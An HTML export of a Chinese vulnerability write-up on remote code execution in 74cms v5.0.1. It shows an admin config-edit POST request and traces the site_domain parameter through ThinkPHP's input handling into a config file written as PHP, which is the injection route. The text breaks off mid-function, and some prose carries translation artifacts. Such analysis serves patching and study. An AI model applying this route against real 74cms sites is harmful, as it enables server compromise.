<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xa22a67af6a76640212f2bea64c5151e3be69158"><span class="csDE05BCC">74cms v5.0.1</span><span class="csECDA2D3">远程执行代码</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">74cms v5.0.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/74cms/74cms%20v5.0.1%e8%bf%9c%e7%a8%8b%e6%89%a7%e8%a1%8c%e4%bb%a3%e7%a0%81_files/image0.png" width="560" height="223" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /74cms/index.php?m=Admin&amp;c=config&amp;a=edit HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 127.0.0.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: application/json, text/javascript, */*; q=0.01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://127.0.0.1/74cms/index.php?m=Admin&amp;c=Config&amp;a=index</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Requested-With: XMLHttpRequest</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 391</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&amp;site_domain=127.0.0.1&amp;site_dir=%2F74cms%2F&amp;top_tel=000-00000000&amp;bootom_tel=000-00000000&amp;contact_email=&amp;address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&amp;bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&amp;icp=icp000000000&amp;isclose=0&amp;close_reason=&amp;statistics=&amp;logo_home=&amp;logo_other=</span></p><p class="cs40DD2BC9"><span class="cs8926E06">c=config&amp;a=edit -&gt; Controller=config&amp;action=edit -&gt; /Application/Admin/Controller/ConfigController.class.php Line 9: I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;) -&gt; trim($site_domain,&#39;/&#39;) -&gt; &#39;.&#39;.implode(&#39;.&#39;,$domain) -&gt; array(&#39;domain&#39;=&gt;$domain) -&gt; $this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;)</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function edit(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(IS_POST){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$site_domain = I(&#39;request.site_domain&#39;,&#39;&#39;,&#39;trim&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$site_domain = trim($site_domain,&#39;/&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$site_dir = I(&#39;request.site_dir&#39;,C(&#39;qscms_site_dir&#39;),&#39;trim&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$site_dir = $site_dir==&#39;&#39;?&#39;/&#39;:$site_dir;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$site_dir = $site_dir==&#39;/&#39;?$site_dir:(&#39;/&#39;.trim($site_dir,&#39;/&#39;).&#39;/&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_POST[&#39;site_dir&#39;] = $site_dir;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($site_domain &amp;&amp; $site_domain != C(&#39;qscms_site_domain&#39;)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($site_domain == C(&#39;qscms_wap_domain&#39;)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;returnMsg(0,&#39;</span><span class="cs7FFD2630">主域名不能与触屏版域名重复！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$str = str_replace(&#39;http://&#39;,&#39;&#39;,$site_domain);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$str = str_replace(&#39;https://&#39;,&#39;&#39;,$str);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(preg_match(&#39;/com.cn|net.cn|gov.cn|org.cn$/&#39;,$str) === 1){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$domain = array_slice(explode(&#39;.&#39;, $str), -3, 3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$domain = array_slice(explode(&#39;.&#39;, $str), -2, 2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$domain = &#39;.&#39;.implode(&#39;.&#39;,$domain);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;COOKIE_DOMAIN&#39;] = $domain;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/ThinkPHP/Common/functions.php</span><span class="cs9C1B1871">第</span><span class="cs8926E06">271</span><span class="cs9C1B1871">行中的</span><span class="cs8926E06">I</span><span class="cs9C1B1871">（</span><span class="cs8926E06">&#39;request.site_domain&#39;</span><span class="cs9C1B1871">，</span><span class="cs8926E06">&#39;&#39;</span><span class="cs9C1B1871">，</span><span class="cs8926E06">&#39;trim&#39;</span><span class="cs9C1B1871">）是字符串。</span><span class="cs8926E06">request.site_domain-&gt; $ _REQUEST [&#39;site_domain&#39;]-&gt; $ _ REQUEST [&#39;site_domain&#39;]</span><span class="cs9C1B1871">是字符串</span><span class="cs8926E06">-&gt;</span><span class="cs9C1B1871">修剪（</span><span class="cs8926E06">$ _REQUEST [&#39;site_domain&#39;]</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">function I($name,$default=&#39;&#39;,$filter=null,$datas=null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(strpos($name,&#39;.&#39;)) { // </span><span class="cs7FFD2630">指定参数来源</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list($method,$name) = &nbsp;&nbsp;explode(&#39;.&#39;,$name,2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{ // </span><span class="cs7FFD2630">默认为自动判断</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$method = &nbsp;&nbsp;&#39;param&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;switch(strtolower($method)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case &#39;get&#39; &nbsp;&nbsp;&nbsp;&nbsp;: &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$input =&amp; $_GET;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case &#39;post&#39; &nbsp;&nbsp;&nbsp;: &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$input =&amp; $_POST;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case &#39;request&#39; : &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$input =&amp; $_REQUEST; &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(&#39;&#39;==$name) { // </span><span class="cs7FFD2630">获取全部变量</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}elseif(isset($input[$name])) { // </span><span class="cs7FFD2630">取值操作</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;$input[$name];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filters = isset($filter) ? $filter.&#39;,&#39;.C(&#39;DEFAULT_FILTER&#39;) : C(&#39;DEFAULT_FILTER&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$filters &nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;isset($filter)?$filter:C(&#39;DEFAULT_FILTER&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($filters) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_string($filters)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(0 === strpos($filters,&#39;/&#39;)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(1 !== preg_match($filters,(string)$data)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">支持正则验证</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &nbsp;&nbsp;isset($default) ? $default : null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filters &nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;explode(&#39;,&#39;,$filters); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}elseif(is_int($filters)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filters &nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;array($filters);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_array($filters)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($filters as $filter){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(function_exists($filter)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data &nbsp;&nbsp;= &nbsp;&nbsp;is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // </span><span class="cs7FFD2630">参数过滤</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data &nbsp;&nbsp;= &nbsp;&nbsp;filter_var($data,is_int($filter) ? $filter : filter_id($filter));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(false === $data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &nbsp;&nbsp;isset($default) ? $default : null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!empty($type)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{ // </span><span class="cs7FFD2630">变量默认值</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;&nbsp;isset($default)?$default:null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;is_array($data) &amp;&amp; array_walk_recursive($data,&#39;think_filter&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $data;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">返回到</span><span class="cs8926E06">/Application/Admin/Controller/ConfigController.class.php</span><span class="cs9C1B1871">第</span><span class="cs8926E06">29</span><span class="cs9C1B1871">行：</span><span class="cs8926E06">array</span><span class="cs9C1B1871">（</span><span class="cs8926E06">&#39;SESSION_OPTIONS&#39;=&gt; array</span><span class="cs9C1B1871">（</span><span class="cs8926E06">&#39;domain&#39;=&gt; $ domain</span><span class="cs9C1B1871">），</span><span class="cs8926E06">&#39;COOKIE_DOMAIN&#39;=&gt; $ domain</span><span class="cs9C1B1871">）</span><span class="cs8926E06"> -&gt; update_config</span><span class="cs9C1B1871">（</span><span class="cs8926E06">$ config</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> CONF_PATH.&#39;url.php&#39;</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">$config[&#39;SESSION_OPTIONS&#39;] = array(&#39;domain&#39;=&gt;$domain);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$config[&#39;COOKIE_DOMAIN&#39;] = $domain;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$this-&gt;update_config($config,CONF_PATH.&#39;url.php&#39;);</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/Application/Common/Controller/BackendController.class.php</span><span class="cs9C1B1871">第</span><span class="cs8926E06">467 </span><span class="cs9C1B1871">行中的</span><span class="cs8926E06">update_config</span><span class="cs9C1B1871">（</span><span class="cs8926E06">$ config</span><span class="cs9C1B1871">，</span><span class="cs8926E06">CONF_PATH.&#39;url.php&#39;</span><span class="cs9C1B1871">）：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">multimerge</span><span class="cs9C1B1871">（</span><span class="cs8926E06">$ config</span><span class="cs9C1B1871">，</span><span class="cs8926E06">$ new_config</span><span class="cs9C1B1871">）</span><span class="cs8926E06"> -&gt; file_put_contents</span><span class="cs9C1B1871">（</span><span class="cs8926E06">$ config_file</span><span class="cs9C1B1871">，</span><span class="cs8926E06">&ldquo; &lt;</span><span class="cs9C1B1871">？</span><span class="cs8926E06">php \ nreturn&rdquo;</span><span class="cs9C1B1871">。</span><span class="cs8926E06">stripslashes</span><span class="cs9C1B1871">（</span><span class="cs8926E06">var_export</span><span class="cs9C1B1871">（</span><span class="cs8926E06">$ config</span><span class="cs9C1B1871">，</span><span class="cs8926E06">true</span><span class="cs9C1B1871">））。</span><span class="cs8926E06">&ldquo;;&rdquo;</span><span class="cs9C1B1871">，</span><span class="cs8926E06">LOCK_EX</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp; &nbsp;&nbsp;public function update_config($new_config, $config_file = &#39;&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 